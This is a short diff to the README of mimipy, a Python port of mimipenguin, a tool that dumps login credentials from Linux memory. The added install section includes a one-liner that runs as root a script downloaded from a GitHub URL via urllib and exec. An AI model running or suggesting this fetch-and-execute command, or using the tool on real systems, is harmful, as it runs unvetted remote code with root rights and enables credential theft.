@@ -8,7 +8,10 @@ This is a port in python of @huntergregal's [mimipenguin.sh](https://github.com/
 
 ## Install
 ```bash
-pip install -r requirements.txt
+#you can install memorpy and run mimipy.py or directly use the packed version that doesn't require any dependency
+python packed/mimipy.py
+#you can also use one the following oneliner :
+sudo python -c 'import urllib;exec urllib.urlopen("https://raw.githubusercontent.com/n1nj4sec/mimipy/master/packed/mimipy.py").read()'
 ```
 
 ## Usage
